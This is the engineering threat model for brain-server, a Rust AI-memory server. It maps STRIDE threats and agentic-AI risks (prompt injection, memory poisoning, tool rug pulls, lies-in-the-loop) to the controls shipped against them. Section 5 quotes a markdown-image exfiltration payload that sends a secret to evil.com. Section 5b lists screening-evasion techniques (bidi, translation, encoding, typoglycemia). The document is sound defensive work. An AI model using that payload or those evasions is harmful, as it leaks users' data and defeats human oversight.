# Threat Model — brain-server

**Methodology:** STRIDE (Microsoft). **Reference standards:** OWASP Top 10:2025
+ Cheat Sheet Series (Context7-verified 2026-07-26), NIST SP 800-63B (digital
identity), NIST SP 800-207 (zero-trust architecture).

**Coverage current through:** v1.28.80 (2026-09-11). The v1.28.63–.75
hardening line (§5b) is folded in; per-release detail lives in `CHANGELOG.md`
and the close-out in `docs/AUDIT.md`.

This document is the engineering-side threat model. For per-release progress
against the controls below, see [`SECURITY.md`](./SECURITY.md).

**Agentic-AI coverage:** the LLM/agent-specific threat classes (prompt
injection, memory poisoning, tool misuse, agentic supply chain, lies-in-the-
loop) are inventoried and mapped to controls in
[`OWASP_AGENTIC_2026.md`](OWASP_AGENTIC_2026.md) (OWASP Top 10 for
Agentic Applications 2026) — read it as the companion layer to this STRIDE
model, not a substitute.

---

## 1. System boundaries

```
                         ┌──────────────────────────────────────────┐
                         │  Internet / untrusted                    │
                         └──────────────────────────────────────────┘
                                          │
                                          ▼
                         ┌──────────────────────────────────────────┐
                         │  Reverse Proxy (operator-managed)        │
                         │  ─ TLS 1.3 termination                   │
                         │  ─ Per-IP rate limit                     │
                         │  ─ WAF / IP allowlist                    │
                         │  ─ HSTS                                 │
                         └──────────────────────────────────────────┘
                                          │ (loopback HTTP)
                                          ▼
┌──────────────────────────────────────────────────────────────────────────┐
│  brain-server (Rust binary, single process)                              │
│  ─ AuthN middleware: JWT/JWS verify + (jti, iss) revocation (v1.2)       │
│  ─ AuthZ middleware: AuthzPolicy::authorize (v1.2)                       │
│  ─ Rate limiter: per-tenant + tiered (v2.1)                              │
│  ─ Audit log: append-only, hash-chained, per-tenant (v1.1)              │
│  ─ SQLite (WAL) or per-domain SQLite (multi-db mode)                    │
│  ─ Optional: A2A federation via mTLS (v3.7)                             │
└──────────────────────────────────────────────────────────────────────────┘
                       │                              │
                       ▼                              ▼
       ┌───────────────────────────┐    ┌───────────────────────────┐
       │  Filesystem (local)       │    │  Peer brain-server (v3.7) │
       │  ─ SQLite DBs             │    │  ─ A2A over mTLS           │
       │  ─ Auth token file (0600) │    │  ─ JWKS verified           │
       │  ─ JWT keys (0700 dir)    │    └───────────────────────────┘
       └───────────────────────────┘
```

**Trust boundaries crossed:**
1. **Internet → reverse proxy** — TLS termination, IP allowlist, per-IP rate limit.
2. **Reverse proxy → brain-server** — loopback only; AuthN/AuthZ at the app.
3. **brain-server → filesystem** — same host; assumes disk not tampered (LUKS
   recommended for full-disk encryption; SQLCipher for at-rest app encryption
   lands in v3.7).
4. **brain-server → peer brain-server** (A2A, v3.7) — untrusted; mTLS + JWS
   verified, scoped capability, data residency allowlist.

---

## 2. STRIDE per asset

### Asset 1: Knowledge graph data (per-tenant)

| Threat | Attack | Mitigation | Status |
|---|---|---|---|
| **S**poofing | Attacker forges tenant identity | JWT/JWS verify + tenant from signed claim (v1.2) | ✅ |
| **T**ampering | Direct DB edit on disk | Filesystem perms; SQLCipher + KMS (v3.7) | 🚧 |
| **T**ampering | Modify a proposal between display and approval | Approve carries the SHA-256 `content_digest` of the read-canonical form; any drift → `409` inside the tx (v1.27.12) | ✅ |
| **R**epudiation | "I didn't write that" | Audit hash chain (v1.1 M2.3) | ✅ |
| **I**nformation disclosure | Tenant A reads tenant B | Per-tenant files + AuthZ at data layer (v1.0+v1.2) | ✅ |
| **D**enial of service | Burst fills the DB | Capacity envelope 507 (v0.9.9); per-tenant limiter (v2.1) | ✅/🚧 |
| **E**levation of privilege | L1 frontline reads L2 escalation | AuthZ trait with deny-default + escalation rules (v1.2) | ✅ |

### Asset 2: Authentication tokens

| Threat | Attack | Mitigation | Status |
|---|---|---|---|
| **S**poofing | Stolen token reuse | Short-lived JWT (≤15 min) + refresh rotation + revocation (v1.2) | ✅ |
| **T**ampering | Readable token/key files (group/world) | Startup fails closed on wide modes (`mode & 0o077`); `brain token rotate` writes 0600 temp + fsync + atomic rename (v1.27.12) | ✅ |
| **T**ampering | Modify JWT payload | JWS signature (RS256/ES256/EdDSA only) (v1.2) | ✅ |
| **R**epudiation | "I didn't issue that token" | `iss` claim verified; key rotation log (v1.2) | ✅ |
| **I**nformation disclosure | Token in URL/logs | `Authorization: Bearer` header only; `SensitiveHeadersLayer` redacts logs (v0.9.4) | ✅ |
| **D**enial of service | Token-storm | Per-tenant rate limit (v2.1) | 🚧 |
| **E**levation of privilege | Token with broadened scope | Scope enforced per-request via AuthZ (v1.2); `alg:none` rejected | ✅ |

### Asset 3: Audit log

| Threat | Attack | Mitigation | Status |
|---|---|---|---|
| **S**poofing | Forge audit entries | Append-only; writer is the authenticated process only | ✅ |
| **T**ampering | Edit existing rows | Keyed hash chain — HMAC-SHA256 over the full row under a per-DB epoch + head pin `(id, hash, epoch)`; break is detectable on read (v1.1 M2.3; keyed epoch shipped v1.27.31) | ✅ |
| **R**epudiation | "The log is wrong" | Keyed chain proves integrity (`/audit/verify`); signed release tags prove code provenance (keyed epoch shipped v1.27.31) | ✅ |
| **I**nformation disclosure | Tenant A reads tenant B's audit | Data-layer filter `WHERE tenant_id = ?` + AuthZ on `/audit` (v1.1 M2.2) | 🚧 |
| **D**enial of service | Fill audit table | Bounded by writes; rotation policy documented | 🚧 |
| **E**levation of privilege | Non-admin queries `/audit` | `admin:<tenant>/*` scope required (v1.2) | ✅ |

### Asset 4: Binary / supply chain

| Threat | Attack | Mitigation | Status |
|---|---|---|---|
| **S**poofing | Malicious binary in place of legit | Build from source; signed git tags (`git tag -s`) | 🚧 |
| **T**ampering | Backdoored transitive dep | `cargo audit` in CI; pinned direct deps; minimal feature flags | ✅ |
| **R**epudiation | "We didn't ship that" | Reproducible build via `Cargo.lock`; tag history | ✅ |
| **I**nformation disclosure | Source leaks secrets | Audited; no secrets in repo; `.env*` in `.gitignore` | ✅ |
| **D**enial of service | CVE in dep causes crash | `CatchPanicLayer`; advisory monitoring; rapid patch process | ✅ |
| **E**levation of privilege | Dep with CVE pre-auth | Pin versions; `cargo audit --deny warnings` in CI | ✅ |
| **T**ampering | Timing sidechannel on RSA private-key ops (`rsa` crate, RUSTSEC-2023-0071 "Marvin") | No fixed release exists anywhere (verified 2026-08-04: `rsa` 0.10.0-rc.18 and `jsonwebtoken` 11 both still affected). Accepted with documentation in `.cargo/audit.toml`: local-daemon timing model (attacker with local timing access already owns the machine), keys at 0600, EdDSA (Ed25519) keys avoid RSA entirely and are supported since v1.2 | audit.toml ignore + docs |

### Asset 5: Network transport

| Threat | Attack | Mitigation | Status |
|---|---|---|---|
| **S**poofing | MITM impersonates server | TLS 1.3 at proxy; mTLS for A2A (v3.7); cert pinning for native clients | ✅/🚧 |
| **T**ampering | Modify traffic in transit | TLS 1.3 (proxy); JWS non-repudiation for A2A payloads (v3.7) | ✅/🚧 |
| **R**epudiation | "I didn't send that request" | `x-request-id` for tracing; JWS for A2A non-repudiation | ✅/🚧 |
| **I**nformation disclosure | Eavesdropper reads traffic | TLS 1.3 terminates at the operator's reverse proxy (the server itself is loopback HTTP); HSTS is a proxy-layer header | ✅ |
| **D**enial of service | SYN flood / slowloris | Proxy handles; per-IP rate limit; per-tenant rate limit (v2.1) | ✅/🚧 |
| **E**levation of privilege | — | (no transport-level privilege concept) | n/a |

---

## 3. v1.2 "AuthN" — AuthN/AuthZ threat mitigations

v1.2.0 introduces JWT/JWS verification + a real AuthZ layer. The five
threat classes below are the ones v1.2 directly mitigates. Each maps to a
control verified by a unit/integration test (308 green).

| Threat | Attack | v1.2 mitigation | Test |
|---|---|---|---|
| **Token replay** | Stolen access token reused after legitimate logout | Access tokens short-lived (≤15 min `exp`) + `(jti, iss)` denylist lookup on every authenticated request; 60s negative cache (bounded eventual consistency — see residual risk §6) | `missing_jti_rejected`, revocation tests |
| **Algorithm confusion** | Attacker sends `alg:none`, or HS256 with the server's public key as the HMAC secret, hoping the verifier falls back to HMAC verification with the public key as the secret | `ALLOWED_ALGS` whitelist (RS256/384/512, ES256/384, EdDSA) checked **before** key lookup; `none`, all HS\*, all PS\* rejected unconditionally | `none_algorithm_rejected`, `hs256_rejected_even_with_matching_key`, `algorithm_whitelist_rejects_ps256` |
| **Cross-tenant data access** | Tenant A's token attempts to read tenant B's chunks | `tenant` claim is taken from the **signed** token (never from query string / body — OWASP Multi-Tenant Cheat Sheet); AuthZ at the data-access layer (`authorize(principal, action, team, domain)`) — handlers cannot resolve a pool they aren't authorized for; default-deny → **403, never 404** (no existence leakage — OWASP A01:2025) | AuthZ cross-tenant integration test |
| **Key compromise** | Signing key exfiltrated from `BRAIN_JWT_KEY_DIR` | Private keys mode 0600, dir mode 0700; `brain key generate` + `prune` rotation keeps two keys live during the overlap window; revocation burns the compromised `jti` set without re-issuing unaffected tokens; future KMS (v3.7) moves keys off the filesystem entirely | key rotation tests, `revoke` tests |
| **Refresh token theft** | Attacker steals a refresh token and races the legitimate user to `/auth/refresh` | Refresh-chain reuse detection: the chain id is derived from `(iss, sub)`; presenting a stale refresh token calls `revoke_chain` and **burns the whole family** (OWASP pattern). The legitimate user's next refresh returns `refresh_reuse_detected` (403) | refresh-chain reuse test |

**Tenant context source (OWASP Multi-Tenant Cheat Sheet, Context7-verified
2026-07-26):**

> "Derive tenant context from authenticated, verified tokens. Use database-
> level isolation like RLS or schemas as a defense in depth. Include
> tenant_id in all resource queries, cache keys, and storage paths."

brain-server goes further than RLS: in multi-db mode (`BRAIN_MULTI_DB=true`),
each tenant's data lives in a **separate SQLite file** (physical isolation).
The `tenant` claim is verified by signature before any data-access call.

### v1.2 honest ceilings (accepted risks, see §5 exit-gate matrix)

- **Revocation is eventually consistent (≤60s).** A stolen token has at most
  60s of access after `/auth/logout` or `/auth/revoke`. Tighter would require
  a per-request DB lookup (latency cost); the bounded cache is the standard
  JWT trade-off. Distributed revocation (Redis-backed denylist) is v2.1.
- **Refresh-chain reuse detection burns the chain silently.** The legit user
  is not notified out-of-band; they discover the burn on their next refresh.
  A user-facing notification channel is v2.1.
- **No hot key reload.** Adding/removing signing keys requires an
  `install-service.sh` restart. File-watch for keys is a small follow-up.
- **EC/Ed JWK emission not implemented.** EC/Ed keys verify correctly but
  don't appear in `/.well-known/jwks.json`; rotate to RSA for any key a third
  party must discover via JWKS.

---

## 4. Residual risk (acceptances)

These are explicit risk acceptances, not bugs. Each is documented in code with
a `ponytail:` comment naming the ceiling and upgrade path.

1. **Shim-mode tenant isolation is row-level, not file-level.** Mitigation:
   SQL `WHERE tenant_id` filter at the data layer. Risk: a SQL injection in
   any query would bypass. Accepted because: every query is parameterized
   (grep-verified), and multi-db mode is the recommended path for true
   multi-tenant deployments.

2. **No encryption at rest before v3.7.** Mitigation: filesystem encryption
   (LUKS/FileVault/BitLocker) recommended in deployment checklist. Risk: a
   disk image captures plaintext DBs. Accepted because: brain-server targets
   single-host trusted-disk deployments; SQLCipher is the v3.7 fix.
   Standing statement (the preflight line's docs truth): the live DB AND its
   `.bak` safety snapshots are PLAINTEXT on the primary host — the encryption
   law covers the warm-standby FOLLOWER only. Full-disk encryption (LUKS/
   FileVault) is the standing recommendation for the primary.

2b. **The audit chain detects tampering, not host compromise.** The HMAC
   chain key and the head pin share the host with the DB: the chain proves
   integrity against SQL/application-level tampering (a flipped row, a
   truncated history, an old image restored over a newer one), NOT against
   an attacker who owns the host — host compromise is disk encryption's
   problem (statement 2). Reporters: demonstrating ".bak extraction on a
   stolen disk" is a KNOWN CEILING, not a novel finding (see SECURITY.md).

3. **Prompt-injection guard is heuristic, not ML-classifier-based.** Ceiling
   documented in `contains_suspicious_pattern`. Accepted because: edge-only
   threat model; recall always marked `untrusted: true` so the consuming
   agent enforces the data/instruction boundary. Since v1.28.71 ("Pores") the
   heuristic is layered (invisible-strip-first scanning, five translation
   families, typoglycemia + bounded encoding tiers) and an optional local
   ONNX classifier adds a second opinion — fail-open (0.0) by design, so the
   HITL gate, never the classifier, remains the boundary.

4. **Per-IP rate limit before v2.1.** Single-process in-memory. Risk: a
   distributed attacker from many IPs can exceed the per-IP cap. Mitigation:
   edge rate limit at the reverse proxy; per-tenant limit (v2.1) keys on the
   verified principal, not IP.

5. **`VACUUM INTO '<path>'` is unparameterized** (SQLite DDL limitation).
   Risk: a path containing `'` would break SQL. Mitigation: paths come from
   operator-controlled env vars (`BRAIN_DB_PATH`, `BRAIN_DATA_ROOT`), not
   from request input. Accepted because: pre-existing pattern across
   `backup.rs`, `migration.rs`, and the rehearsal tool.

6. **Token revocation is eventually consistent (≤60s).** Mitigation: the
   negative cache TTL is bounded; an attacker with a stolen token has at most
   60s of access after revocation. Accepted because: this is the standard
   JWT revocation tradeoff; tighter would require per-request DB lookup
   (latency cost).

---

## 5. Exfiltration surfaces (the 2026-09-07 "Shutter" closure)

Model-controlled markdown is the canonical covert-exfil channel (EchoLeak /
CVE-2025-32711 class: `<img src="http://evil.com/steal?data=SECRET">`). The
defense is layered across two trees — the server strips what it can before
emission, and the openclaw UI refuses to FETCH what survives:

| Surface | Posture | Where closed |
|---|---|---|
| Markdown image/link refs in emitted content | Server-side strip at the read seam (`gate::strip_markdown_refs`) — recall hits, notes, proposals never carry live `![](url)` markup | brain-server v1.20.27 "Cordon" |
| Document-mode remote images (UI) | **Default OFF** — renders the labeled not-loaded fallback; opt-in via render options AND the operator's trusted-host allowlist (exact hosts, no subdomains implied) | openclaw "Shutter" (X-E1 / F-E1) |
| Favicon auto-fetch beacon (UI) | **Default OFF** — the proxy route 404s unless the operator enables fetching AND allowlists the host; unlisted hosts render a letter tile, no request | openclaw "Shutter" (X-E2 / F-E2) |
| `data:` image URIs (UI) | Render only inside a 64 KiB decoded budget; oversized payloads degrade to the fallback (no fetch channel — the budget caps render-time covert channels and pathological payloads) | openclaw "Shutter" (X-E4) |

Standing ceilings, documented honestly:

- **Bare URLs in prose survive every strip.** Linkified-but-inert is the
  shipped contract: a URL pasted as text renders as a link and does not
  fetch until a human clicks. Closing THAT is the documented `gate.rs`
  ceiling, still open by design.
- **Operator allowlists are trust, not safety.** An allowlisted host is a
  place the operator vouches for; if the operator allowlists a hostile
  host, the gate is doing its job when it fetches exactly that host and
  nothing else. The SSRF guard (loopback/metadata/private refusal) stays
  enforced even for allowlisted hosts.
- **Proxied favicon fetches are same-origin and authenticated**; the UI
  never fetches remote image bytes directly — everything rides the
  gateway proxy with its byte/time caps and strict media validation.

---

## 5b. The 2026-09 hardening line (v1.28.63–.75): controls and ceilings

Thirteen releases closed every code-closeable finding of the 2026-09-06 joint
audit (41 findings; close-out with dispositions in `docs/AUDIT.md`). The
controls below are the threat-model-relevant additions, in ship order:

| Threat | Control | Shipped |
|---|---|---|
| Unapproved channel egress (workflow-outbox forgery) | Reserved topic vocabulary enforced at EVERY outbox enqueue seam (`channel/*`, `steering`, `workflow/*` reachable only through kernel paths); closed run-status vocabulary (`active\|cancelled\|closed\|completed\|fired\|resolved`, see `docs/api.md`); valet `what` screened on all write paths; alert-bus kind vocabulary closed | v1.28.63 "Wardline" |
| Revocation scoped to mesh only | The principal kill-switch is consulted in the bearer AuthN path (revocation BEFORE signature/row work, probe-blind); denylist rows expire at the token's real `exp`, not a fixed TTL | v1.28.64 "Blackout" + v1.28.73 |
| Poisoned memory re-entering prompts | `/suggest` hits carry `untrusted: true` (three-surface parity); openclaw host sanitizes EVERY plugin context segment at the merge seam (invisible strip + forged-marker neutralization); MCP tool results ride the external-content envelope; plugin↔server invisible-set parity fixture in CI | v1.28.65 "Meridian" |
| Lies-in-the-loop (approver sees laundered descriptions) | Plugin approvals carry the EFFECTIVE tool-call arguments on both transports (display JSON, capped with exact-count markers); truncation keeps head AND tail unconditionally with count-first elision; `brain client dsar` and restore prompt before acting | v1.28.66 "Truthglass" |
| Self-asserted identity (rug pulls, signer ambiguity) | Parcels require `expected_signer` (400 otherwise); the operator signing key pins verification (foreign signer ≠ silent accept); fork MCP catalog is sha256-pinned per tool + per server and reconciled EVERY run — tools whose fingerprint MOVED post-approval are hard-blocked (never projected) until re-acknowledged, never-seen tools stay usable-but-`pendingAck`-flagged so first use is not gated; recovery is deleting `mcp-catalog-pins.json` (everything re-surfaces as new/flagged, never silently); pinning applies where the caller passes `catalogPinsPath` (default-path spec'd upstream as U3); `BRAIN_MCP_SCOPE=read` denies the write verbs at dispatch | v1.28.67 "Pin" + fork hard-block (unreleased) |
| Markdown-image / beacon exfiltration (EchoLeak class) | Document-mode remote images default OFF behind an exact-host operator allowlist (UI + server re-verify); favicon proxy default OFF; `data:` URIs capped at a 64 KiB decoded budget | v1.28.68 "Shutter" (fork) |
| Server-side SSRF / DNS rebinding on egress | The shared egress client resolves → validates EVERY address against the IANA special-purpose table (incl. CGNAT 100.64/10) → pins insert-only for the process lifetime; alert/DSAR sinks validate at boot, private sinks need `BRAIN_EGRESS_ALLOW_PRIVATE=1` (fail-closed); harness binary resolution is absolute-path only; spawned children die on drop | v1.28.69 "Deadbolt" |
| Plugin-side transport smuggling (absolute-URL / protocol-relative path) | `BrainClient` pins `new URL(baseUrl).origin` at construction, refuses cross-origin requests pre-send and cross-origin responses post-redirect (`res.url` re-pin); stacks on the `assertSafeBaseUrl` scheme gate (https, or http only on loopback). Token files refuse multiline content (operator-token leak down the agent path closed). Ceiling: DNS-rebind of the pinned host and never-seen-tool flagging (first-use not gated) remain accepted residuals — loopback-first deployments only | v1.28.79 "Parity" (fork) |
| Fork prompt-merge trust (brain-fence spoof) | The merge seam splits brain recall fences like every other marker — no plugin may emit the literal and borrow recall trust; team-bridge mirrors honor chat-type gates; forwarded-header contradiction is denied without a trust basis and proxy-chain commas no longer force strict off; missing-Origin pre-pass is architecture (non-browser clients authenticate post-handshake). Upstream-hunk items (multi-block envelope, `systemPrompt` seam, default pins path, replay prefix) ship as PR specs kept with the audit archive | v1.28.79 "Parity" |
| Opaque-mode authority collapse (one superuser token) | Token-file line 2 authenticates as a scoped agent principal (`AgentLoopback`: no Admin, no purge/domains/revoke/dsar/DPO boards, writes proposal-gated); Blackout kill-switch revokes it by name; `/metrics` + `/health/db` scope per principal; single-token deployments keep the legacy posture with a boot warn | v1.28.70 "Twokeys" |
| Injection screening evasion (bidi, translation, encoding) | Layer-1 screen runs on invisible-stripped text (verdicts only tighten); the 13-phrase blocklist became five translation families + a typoglycemia tier + a bounded encoding tier; optional local ONNX classifier (fail-open, `BRAIN_INJECTION_CLASSIFIER=off` opts out, `/health/db` echoes state); log values pass ANSI/C1 scrubbing | v1.28.71 "Pores" |
| Hostile markup at the read seam | `sanitize_read` strips a closed, case-insensitive set of hostile elements (script/iframe/svg/img/…) after the markdown-ref strip; storage stays verbatim so outstanding approval digests never move; denied `/events` subscribers get 403 BEFORE the stream opens; KB generator escapes operator-configured args | v1.28.72 "Scrim" |
| Key + evidence lifecycle gaps | The operator signing key is deterministic (`operator.ed25519`; wrong-size/leaked seeds refuse LOUDLY); `brain key rotate` moves current→`.prev` (verify-only, one deep) with `signing_epoch` on agent cards; chain-less backup images REFUSE restore unless `--allow-chainless`; legacy-epoch chains restore disclosed as forgeable; the replay cache evicts the oldest quarter (not clear-all) and the revocation drain pages + writes `drain_incomplete` | v1.28.73 "Keyring" |
| Taint laundering across sessions | `/ingest` accepts `origin_context: owner\|channel` (unknown = 400); channel captures store origin `channel-capture`; the label rides recall into the plugin fence (`[memory \| channel-capture]`) and the openclaw fork marks quoted/replayed memory prefixes as untrusted replay; plugin `untrustedOrigins: "exclude"` drops captured hits from auto-inject; OTLP span attributes pass ANSI/PII sanitization (collectors are untrusted infrastructure) | v1.28.74 "Origin" |
| Dormant exec mediation (Loop-line precondition) | The dormant hostcall `exec` mediation hardened: argv0 AND allowlist entries canonicalize (planted symlinks and honest aliases distinguished), the danger screen is the documented tripwire and gained the pipe-to-shell family, `kill_on_drop` pinned at the spawn seam; dormancy is a machine-checked state (`hostcalls_mediation_stays_unwired_until_loop_line`); the installer writes `BRAIN_WRITE_POSTURE=review` on new installs only (operator-set values never stomped); `badges.sh --selfcheck` refuses without the committed SBOM artifact | v1.28.75 "Preflight" |
| Authenticated-transport redirect bearer leak (fork) | `BrainClient` never follows redirects (`redirect: "manual"` — any 3xx refuses before auth can ride it); the pre-send origin pin + response re-pin stay as second layers | v1.28.80 (fork) |
| Merge-seam `systemPrompt` bypass (upstream-hunk, fork-side defense) | The merged `systemPrompt` passes `sanitizePluginContext` at the fork-owned merge seam (upstream file untouched — filed as U2) | v1.28.80 (fork) |
| MCP multi-block envelope shedding + image/URI pass-through | All instruction-capable text rides ONE enveloped block (prefix+payload+suffix inseparable); every block through the full sanitizer (invisible + forged markers + LLM special tokens); per-block 8k bound; oversize images withheld as labeled placeholders (filed as U1 upstream) | v1.28.80 (fork) |
| Unsigned catalog-pin acks (fs-write re-pin) | Pin acks carry a detached Ed25519 signature (TOFU keypair beside the pins); forged/unsigned files rebuild LOUDLY; ceiling: filesystem writers can re-key — operator-bound keys are the Loop line | v1.28.80 (fork) |
| No-auth boot as silent posture | `BRAIN_REQUIRE_AUTH=1` refuses unauthenticated boot (fail-closed parse); otherwise a loud boot warn + `/health/db` `authn` echo (`enabled`, `required`) | v1.28.80 |
| Silent cross-domain mixing (shim rescue leg) | `/recall` carries `included_global` (always present) so global-corpus mixing into domain queries is visible, never silent | v1.28.80 |
| Total-grant scope issuance (`*/*`) | A team+domain wildcard scope grants nothing without `BRAIN_ALLOW_WILDCARD_GRANT=1` (fail-closed parse, loud boot warn when admitted) | v1.28.80 |
| Single-approver promotion (approval fatigue) | Opt-in `BRAIN_APPROVAL_QUORUM=2`: two DISTINCT principals before promotion (first records a hash-chained audit row, same-principal repeat 409s); publish/remedy branches keep their own semantics | v1.28.80 |
| Keyless self-assertion invisible to consumers | Verify JSON carries `authentication: "operator-pinned" \| "self-asserted (no operator key)"` | v1.28.80 |
| Allow-policy blindness (`INJECTION_POLICY=allow`) | Monotonic `allow_policy_bypasses` tripwire on `/health/db` beside the policy echo | v1.28.80 |

**Ceilings this line explicitly keeps** (do not "fix" without amending the
architecture):

- The screen is a tripwire, not a boundary — the boundary is the HITL gate
  (mantra 3). Pores widens the tripwire; it never makes ingest "safe".
- Origin is ONE boolean-grade label (`owner` vs `channel-capture`), not a
  lattice or policy engine — no auto-promotion exists to protect.
- MCP catalog drift is SURFACED (notify + `pendingAck`), not gated — the ack
  is an explicit operator touch.
- Egress pinning defends the server's own sinks; operator allowlists (webhook
  hosts, remote images) are trust, not safety.
- The audit chain detects SQL/application-level tampering, not host
  compromise; the live DB and `.bak` snapshots stay plaintext on the primary
  (§4 items 2/2b).
- Single-tenant storage: the domain shim is a label, not a boundary —
  `included_global` makes mixing visible; true isolation is `BRAIN_MULTI_DB`
  (v2.0 Cortex). Quorum is opt-in (default 1); pin-ack signatures are TOFU,
  not operator-bound; DNS-rebind of the plugin pin and keyless
  self-assertion stay disclosed (v1.28.80 rows above).

---

## 6. Per-release security exit gates

Each major release must complete these exit gates (in addition to fmt/clippy/test):

| Gate | v1.0 ✅ | v1.1 | v1.2 | v2.0 | v2.1 | v3.7 |
|---|---|---|---|---|---|---|
| THREAT_MODEL.md updated | ✅ | ✅ | ✅ | □ | □ | □ |
| OWASP Top 10:2025 coverage checked | ✅ | ✅ | ✅ | □ | □ | □ |
| `cargo audit --deny warnings` clean | ✅ | ✅ | ✅ | □ | □ | □ |
| Penetration test report (3rd-party for v2.0+) | — | — | — | □ | □ | □ |
| AuthN test matrix (OWASP JWT Cheat Sheet) | n/a | partial | ✅ | ✓ | ✓ | ✓ |
| AuthZ test matrix (cross-tenant) | n/a | partial | ✅ | □ | ✓ | ✓ |
| Rate limit test (per-tenant + tiered) | n/a | n/a | n/a | n/a | □ | ✓ |
| Encryption audit (KMS + per-field) | n/a | n/a | n/a | n/a | n/a | □ |
| Audit hash-chain verification | n/a | ✅ | ✅ | ✓ | ✓ | ✓ |
| Compliance checklist (SOC 2 / ISO 27001 mappings) reviewed | ✅ | ✅ | ✅ | □ | □ | □ |

---

## 7. What this threat model does NOT cover

- **Physical access to the host.** Assumes the operator controls physical
  access (full-disk encryption is the operator's concern).
- **Social engineering.** Out of scope; covered by ops policies, not code.
- **Insider threat from the operator themselves.** The operator can read every
  DB. For true multi-party computation, federate (v3.7 A2A) so no single
  party has all data.
- **Quantum computing attacks.** Asymmetric crypto (RSA, ECDSA) is quantum-
  vulnerable. Post-quantum algorithms (ML-DSA / ML-KEM from NIST PQC) are
  reserved for a future major release when libraries stabilize.
- **Supply chain of the operating system.** Assumes the OS / kernel / libc
  are trusted. Hardened OS images (Flatcar, Talos) are an operator choice.
- **Payment data (PCI DSS — explicit non-scope).** Payment-card data is never
  ingested, stored, or transited by this system; no PCI scope is claimed or
  achievable through this component. Content screening + PII masking exist
  for privacy law, not as PCI controls.

---

## 8. Review cadence

- **Per major release**: full STRIDE review, update this doc, update OWASP
  coverage in `SECURITY.md`.
- **Per CVE in a direct dep**: immediate patch release.
- **Per discovered vuln (security advisory)**: immediate patch, retro on
  why the threat model missed it, update doc.
- **Annual**: third-party penetration test for any version marketed as
  "enterprise-ready" (target: v2.0+).
